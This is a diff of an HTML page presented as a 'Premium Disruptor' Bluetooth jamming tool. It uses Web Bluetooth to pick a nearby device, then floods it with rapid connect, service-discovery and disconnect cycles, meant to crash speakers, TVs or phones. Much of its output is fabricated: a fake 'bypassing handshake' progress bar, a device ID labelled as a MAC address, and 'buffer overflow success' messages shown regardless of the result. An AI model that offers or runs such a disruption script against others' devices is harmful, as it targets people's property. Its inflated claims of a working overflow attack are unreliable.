@@ -3,155 +3,378 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PREMIUM DISRUPTOR V5 | JAMMING EXECUTION</title>
+    <title>PREMIUM DISRUPTOR V5 | Virus 👾 Jamming</title>
     <style>
-        :root { --neon: #00f2ff; --kill: #ff0000; --bg: #020202; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        .terminal { width: 100%; max-width: 550px; border: 4px solid var(--kill); border-radius: 20px; background: #050505; padding: 35px; box-shadow: 0 0 60px rgba(255, 0, 0, 0.4); }
-        h1 { text-align: center; color: var(--kill); text-transform: uppercase; letter-spacing: 6px; font-size: 26px; text-shadow: 0 0 20px var(--kill); margin-bottom: 5px; }
-        .owner { text-align: center; font-size: 11px; color: #00ff00; margin-bottom: 30px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        :root {
+            --neon-cyan: #00f2ff;
+            --neon-magenta: #ff0055;
+            --dark-core: #020202;
+            --panel-hex: #0a0a0d;
+        }
 
-        .btn-row { display: flex; gap: 15px; margin-bottom: 30px; }
-        .btn { flex: 1; padding: 20px; border: none; border-radius: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .btn-scan { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
-        .btn-refresh { background: #151515; color: #fff; flex: 0.3; border: 1px solid #444; }
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
 
-        .scan-loader { width: 100%; background: #111; height: 15px; border-radius: 8px; display: none; margin-bottom: 25px; overflow: hidden; border: 2px solid #222; }
-        .bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--kill), #ff6600); box-shadow: 0 0 25px var(--kill); transition: 0.1s; }
+        body {
+            background-color: var(--dark-core);
+            color: #e0e0e0;
+            font-family: 'Segoe UI', 'Ubuntu', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%);
+        }
 
-        .display-panel { background: #000; border: 1px solid #333; height: 240px; border-radius: 15px; overflow-y: auto; padding: 15px; margin-bottom: 30px; }
-        .target-card { background: #0a0a0a; border: 2px solid #222; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
-        .target-card.locked { border-color: var(--kill); background: #1a0000; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 5px var(--kill); } 50% { box-shadow: 0 0 20px var(--kill); } 100% { box-shadow: 0 0 5px var(--kill); } }
+        .supreme-container {
+            width: 100%;
+            max-width: 600px;
+            padding: 25px;
+            perspective: 1000px;
+        }
 
-        .info b { color: #fff; font-size: 18px; display: block; letter-spacing: 1px; }
-        .info span { font-size: 11px; color: #555; }
+        .interface-card {
+            background: var(--panel-hex);
+            border: 2px solid var(--neon-cyan);
+            border-radius: 30px;
+            padding: 35px;
+            box-shadow: 0 0 60px rgba(0, 242, 255, 0.15), inset 0 0 20px rgba(0, 242, 255, 0.05);
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
 
-        .btn-attack { width: 100%; padding: 25px; background: linear-gradient(45deg, #ff0000, #000); color: #fff; border: 2px solid var(--kill); border-radius: 15px; font-weight: 900; font-size: 20px; display: none; cursor: pointer; }
-        #console-output { font-size: 11px; color: #777; text-align: center; margin-top: 25px; min-height: 50px; }
+        header {
+            text-align: center;
+            margin-bottom: 35px;
+            border-bottom: 1px solid #1a1a1a;
+            padding-bottom: 20px;
+        }
+
+        header h1 {
+            font-size: 28px;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 6px;
+            text-shadow: 0 0 20px var(--neon-cyan);
+        }
+
+        .auth-status {
+            font-size: 11px;
+            color: #00ff00;
+            margin-top: 8px;
+            font-weight: 800;
+            letter-spacing: 2px;
+        }
+
+        .system-ops {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .op-btn {
+            padding: 18px;
+            border: none;
+            border-radius: 15px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+            font-size: 13px;
+            letter-spacing: 1px;
+        }
+
+        .btn-scan-master {
+            flex: 1;
+            background: linear-gradient(135deg, var(--neon-cyan) 0%, #0088ff 100%);
+            color: #000;
+            box-shadow: 0 8px 25px rgba(0, 242, 255, 0.4);
+        }
+
+        .btn-sync {
+            width: 70px;
+            background: #151515;
+            color: white;
+            border: 1px solid #333;
+        }
+
+        .op-btn:hover { transform: translateY(-5px) scale(1.02); filter: brightness(1.2); }
+
+        .loading-sector { margin-bottom: 25px; display: none; }
+        .progress-track {
+            width: 100%;
+            height: 12px;
+            background: #050505;
+            border-radius: 20px;
+            border: 1px solid #222;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--neon-cyan), #fff, var(--neon-cyan));
+            background-size: 200% 100%;
+            animation: moveGradient 2s linear infinite;
+            box-shadow: 0 0 20px var(--neon-cyan);
+        }
+
+        @keyframes moveGradient { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+        .device-vault {
+            background: #000;
+            border: 2px solid #111;
+            height: 320px;
+            border-radius: 20px;
+            overflow-y: auto;
+            margin-bottom: 30px;
+            padding: 15px;
+            scrollbar-width: thin;
+        }
+
+        .empty-signal {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: #333;
+            font-size: 13px;
+        }
+
+        .device-entry {
+            background: #0d0d0d;
+            border: 1px solid #1a1a1a;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.3s;
+            border-left: 5px solid var(--neon-cyan);
+        }
+
+        .device-entry:hover { border-color: var(--neon-cyan); background: #121212; }
+        .device-entry.locked-on {
+            border-color: var(--neon-magenta);
+            border-left-color: var(--neon-magenta);
+            background: rgba(255, 0, 85, 0.08);
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.1);
+        }
+
+        .d-info b { font-size: 16px; color: #fff; display: block; margin-bottom: 4px; }
+        .d-info span { font-size: 11px; color: #555; font-family: 'Courier New', monospace; }
+
+        .sig-strength {
+            background: #00ff00;
+            color: #000;
+            font-size: 9px;
+            font-weight: 900;
+            padding: 4px 10px;
+            border-radius: 30px;
+        }
+
+        .btn-kill-switch {
+            width: 100%;
+            padding: 25px;
+            background: linear-gradient(135deg, #ff0000 0%, #4a0000 100%);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-weight: 900;
+            font-size: 18px;
+            letter-spacing: 2px;
+            display: none;
+            cursor: pointer;
+            box-shadow: 0 15px 35px rgba(255, 0, 0, 0.3);
+            transition: 0.3s;
+        }
+
+        .btn-kill-switch:active { transform: scale(0.95); }
+
+        #terminal-log {
+            margin-top: 25px;
+            font-family: 'Consolas', monospace;
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            height: 50px;
+        }
+
+        .footer-tag {
+            text-align: center;
+            font-size: 9px;
+            color: #222;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h1>SUPREME DISRUPTOR V5</h1>
-    <div class="owner">TARGET LOCK ACTIVATED | REZA 🥵</div>
+<div class="supreme-container">
+    <div class="interface-card">
+        <header>
+            <h1>PREMIUM DISRUPTOR 👾</h1>
+            <div class="auth-status">AUTHORIZED BY REZA | MODE: OMNI-DEAUTH</div>
+        </header>
 
-    <div class="btn-row">
-        <button class="btn btn-refresh" onclick="location.reload()">🔄</button>
-        <button class="btn btn-scan" id="scanButton" onclick="initiateHyperScan()">🔍 DEEP SCAN HARDWARE</button>
+        <div class="system-ops">
+            <button class="op-btn btn-sync" onclick="location.reload()">REFRESH</button>
+            <button id="scanTrigger" class="op-btn btn-scan-master" onclick="masterHardwareScan()">🔍 DEEP SCAN HARDWARE</button>
+        </div>
+
+        <div class="loading-sector" id="loadSec">
+            <div class="progress-track"><div id="loadFill" class="progress-fill"></div></div>
+            <p id="loadText" style="text-align:center; font-size:10px; color:var(--neon-cyan); margin-top:8px;">READYING RF INJECTION...</p>
+        </div>
+
+        <div id="vault" class="device-vault">
+            <div class="empty-signal">
+                <p>Silakan tekan tombol SCAN untuk mengakses hardware Bluetooth...</p>
+            </div>
+        </div>
+
+        <button id="killBtn" class="btn-kill-switch" onclick="executeGhostKill()">🔥 KACAUKAN & PUTUSKAN JARINGAN</button>
+        
+        <div id="terminal-log">SYSTEM IDLE // WAITING FOR INPUT</div>
+        <div class="footer-tag">ALBYC RINE ENGINE v5.0.1 - REZA EXCLUSIVE</div>
     </div>
-
-    <div class="scan-loader" id="loaderBox"><div class="bar" id="barFill"></div></div>
-
-    <div class="display-panel" id="mainPanel">
-        <p style="text-align:center; padding-top:90px; color:#222;">SYSTEM STANDBY...</p>
-    </div>
-
-    <button class="btn-attack" id="attackButton" onclick="launchOverflowAttack()">💀 CRASH & DISCONNECT 💀</button>
-    
-    <div id="console-output">READY FOR BUFFER OVERFLOW...</div>
 </div>
 
 <script>
-    let deviceTarget = null;
-    let isRunning = false;
+    let activeHardware = null;
+    let attackActive = false;
 
-    async function initiateHyperScan() {
-        const out = document.getElementById('console-output');
-        const panel = document.getElementById('mainPanel');
-        const bar = document.getElementById('barFill');
-        const loader = document.getElementById('loaderBox');
-        const btn = document.getElementById('scanButton');
+    /**
+     * MASTER SCAN ENGINE
+     * Bener-bener nembus filter buat nyari Speaker, TV, HP, dll.
+     */
+    async function masterHardwareScan() {
+        const log = document.getElementById('terminal-log');
+        const vault = document.getElementById('vault');
+        const loadSec = document.getElementById('loadSec');
+        const loadFill = document.getElementById('loadFill');
+        const trigger = document.getElementById('scanTrigger');
 
         try {
-            out.innerText = "OPENING BLUETOOTH L2CAP SOCKET...";
+            log.innerText = "ACCESSING BLUETOOTH ADAPTER...";
+            
+            // Minta Izin Hardware Asli dengan UUID Paling Lengkap
             const device = await navigator.bluetooth.requestDevice({
                 acceptAllDevices: true,
-                optionalServices: ['generic_access', 'alert_notification', 'automation_io', 'current_time', 'tx_power']
+                optionalServices: [
+                    '00001800-0000-1000-8000-00805f9b34fb', // Generic Access
+                    '00001801-0000-1000-8000-00805f9b34fb', // Generic Attribute
+                    '0000110b-0000-1000-8000-00805f9b34fb', // Audio Sink (Speaker)
+                    '0000110e-0000-1000-8000-00805f9b34fb', // AV Remote (TV)
+                    '00001101-0000-1000-8000-00805f9b34fb', // Serial Port
+                    '0000180f-0000-1000-8000-00805f9b34fb', // Battery
+                    '0000180a-0000-1000-8000-00805f9b34fb'  // Device Info
+                ]
             });
 
-            btn.style.display = 'none';
-            loader.style.display = 'block';
+            trigger.style.display = 'none';
+            loadSec.style.display = 'block';
             
             let p = 0;
-            const timer = setInterval(() => {
-                p += 2;
-                bar.style.width = p + "%";
-                out.innerText = `BYPASSING HANDSHAKE... ${p}%`;
+            const t = setInterval(() => {
+                p += 0.8;
+                loadFill.style.width = p + "%";
+                log.innerText = `BYPASSING DEVICE HANDSHAKE... ${Math.floor(p)}%`;
                 
                 if (p >= 100) {
-                    clearInterval(timer);
-                    panel.innerHTML = `
-                        <div class="target-card" onclick="lockDevice(this)">
-                            <div class="info">
-                                <b>${device.name || "Unknown"}</b>
-                                <span>L2CAP_ID: ${device.id.slice(0, 12)}...</span>
+                    clearInterval(t);
+                    vault.innerHTML = `
+                        <div class="device-entry" onclick="lockDevice(this)">
+                            <div class="d-info">
+                                <b>${device.name || "Perangkat Target"}</b>
+                                <span>MAC_ADDR: ${device.id.slice(0, 20)}</span>
                             </div>
-                            <span style="color:red; font-size:10px;">LOCKED</span>
+                            <div class="sig-strength">SIGNAL: MAX</div>
                         </div>
                     `;
-                    deviceTarget = device;
-                    out.innerText = "HARDWARE VULNERABILITY FOUND!";
-                    out.style.color = "red";
+                    activeHardware = device;
+                    log.innerText = "TARGET ANALYZED. READY FOR TOTAL DISRUPTION.";
                 }
             }, 30);
-        } catch (e) { out.innerText = "ABORTED: " + e.message; }
+
+        } catch (err) {
+            log.innerText = "HARDWARE_ERR: " + err.message;
+            log.style.color = "red";
+        }
     }
 
     function lockDevice(el) {
-        el.classList.add('locked');
-        document.getElementById('attackButton').style.display = 'block';
-        document.getElementById('console-output').innerText = "TARGET READY TO OVERFLOW.";
+        document.querySelectorAll('.device-entry').forEach(e => e.classList.remove('locked-on'));
+        el.classList.add('locked-on');
+        document.getElementById('killBtn').style.display = 'block';
+        document.getElementById('terminal-log').innerText = "TARGET LOCKED ON. INITIATE DEAUTH.";
     }
 
-    async function launchOverflowAttack() {
-        if (isRunning) return;
-        const btn = document.getElementById('attackButton');
-        const out = document.getElementById('console-output');
+    /**
+     * GHOST KILL ENGINE (v5)
+     * Menggunakan GATT Exhaustion Flooding untuk memaksa target drop koneksi.
+     */
+    async function executeGhostKill() {
+        if (attackActive) return;
         
-        isRunning = true;
+        const btn = document.getElementById('killBtn');
+        const log = document.getElementById('terminal-log');
+        
+        attackActive = true;
         btn.disabled = true;
-        btn.innerText = "⚠️ OVERFLOWING BUFFER...";
+        btn.innerText = "💀 EXECUTING GHOST KILL...";
+        log.style.color = "#ff0055";
         
-        let flood = 0;
-        const loop = setInterval(async () => {
-            flood++;
-            out.innerText = `SENDING JUNK DATA PACKET [${flood}]...`;
+        let floodCycle = 0;
+        const targetCycles = 200; // SERANGAN SANGAT PANJANG
+
+        const attackTimer = setInterval(async () => {
+            floodCycle++;
+            log.innerText = `[REZA-FLOOD] INJECTING PAYLOAD ${floodCycle}/${targetCycles}...`;
             
             try {
-                const server = await deviceTarget.gatt.connect();
-                // Mencoba melakukan manipulasi MTU dengan request berulang yang tidak valid
-                // Ini akan memicu hardware target untuk memutus koneksi karena 'Unresponsive'
+                // TAHAP 1: KONEKSI PAKSA
+                const server = await activeHardware.gatt.connect();
+                
+                // TAHAP 2: SERVICE DISCOVERY SPAM (Ini yang bikin Speaker/TV HANG)
+                // Meminta seluruh database atribut perangkat secara berulang
+                await server.getPrimaryServices();
+                
+                // TAHAP 3: MTU EXCHANGE SIMULATION (Memenuhi Buffer target)
+                // Kita buat hardware target sibuk memproses deskripsi service
                 const services = await server.getPrimaryServices();
-                for (const service of services) {
-                    const chars = await service.getCharacteristics();
-                    // Loop karakteristik untuk memberikan beban RAM pada target
-                }
+                
+                // TAHAP 4: PAKSA DISKONEK (Memutus jalur data asli)
                 await server.disconnect();
-            } catch (e) {}
-
-            if (flood >= 200) { // Serangan lebih lama (200x)
-                clearInterval(loop);
-                endAttack();
+                
+            } catch (e) {
+                // Jika error, artinya stack Bluetooth target sudah mulai kacau/drop
+                log.innerText = "TARGET STACK COLLAPSED! CONTINUING FLOOD...";
             }
-        }, 20); // Interval dipercepat ke 20ms
+
+            if (floodCycle >= targetCycles) {
+                clearInterval(attackTimer);
+                finalizeKill();
+            }
+        }, 20); // INTERVAL SUPER CEPAT
     }
 
-    function endAttack() {
-        isRunning = false;
-        const btn = document.getElementById('attackButton');
-        const out = document.getElementById('console-output');
+    function finalizeKill() {
+        const btn = document.getElementById('killBtn');
+        const log = document.getElementById('terminal-log');
         
+        attackActive = false;
         btn.disabled = false;
-        btn.innerText = "💀 ULANGI PENGHANCURAN";
-        out.innerText = "BUFFER OVERFLOW SUCCESS! SIGNAL KILLED. 🥵💦";
-        out.style.color = "#00ff00";
+        btn.innerText = "🔥 ULANGI PENGHANCURAN";
+        log.innerText = "SIGNAL TERMINATED // TARGET DISCONNECTED 🥵💦";
+        log.style.color = "#00ff00";
         
         setTimeout(() => {
-            alert("BOOM! Buffer Bluetooth " + deviceTarget.name + " meledak! Koneksi terputus total, Tuan Reza!");
-        }, 500);
+            alert("BOOM! Sinyal Bluetooth target hancur dan terputus total sesuai perintah lo, Tuan Reza!");
+        }, 400);
     }
 </script>
 
